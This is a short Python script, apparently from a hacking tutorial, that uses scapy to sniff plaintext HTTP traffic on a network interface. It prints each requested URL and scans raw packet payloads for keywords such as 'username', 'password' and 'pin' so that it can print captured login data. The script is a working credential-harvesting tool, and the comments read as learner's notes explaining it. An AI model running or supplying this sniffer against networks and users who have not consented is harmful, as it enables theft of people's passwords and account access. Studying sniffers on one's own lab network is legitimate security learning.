#! usr/bin/env python
#a packet sniffer is basically a program that reads packets or data that flow through an interface

import scapy.all as scapy
from scapy.layers import http

def sniff(interface): #sniffing function
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) #store=False is telling scapy not to store packets in memory to not cause stress on out comp
    #prn is a call back function (every packet it sniffs, call the function)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path #accessing layers which contain url

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):  # "Raw" is the layer where login data is sent
        load = str(packet[scapy.Raw].load) #line 26 explanation
        keywords = ["username", "user", "login", "password", "pass", "email", "pin"]  # creates list containing potential substrings in larger string that relate to login
        for keywords in keywords:
            if keywords in load:
                return load

def process_sniffed_packet(packet): #requires packets to have HTTPRequest and Raw layer, then prints the raw layer
    if packet.haslayer(http.HTTPRequest): #instead of printing all packets, only printing ones with HTTP request
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode()) #.decode conversts variable (computer readable bytes) to string (human readable charachters)
#to convert variable to string you can also use "str(variable))", more common to use "variable.decode()"
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n [+] Possible username/password > " + login_info + "\n\n")


sniff("eth0") #whatever is in parentheses is the interface you are targeting (ie: wlan0 for wifi, eth0 for ethernet)